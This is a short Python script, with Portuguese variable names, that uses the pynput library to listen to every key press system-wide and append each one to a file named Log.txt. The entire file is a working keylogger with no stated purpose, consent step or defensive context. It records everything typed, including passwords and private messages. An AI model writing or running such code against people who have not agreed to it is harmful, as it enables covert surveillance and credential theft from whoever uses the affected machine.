from pynput.keyboard import Listener

def log(teclado):
    with open('Log.txt', 'a') as arquivo_log:
        arquivo_log.write(str(teclado))

with Listener(on_press=log) as monitor:
    monitor.join()
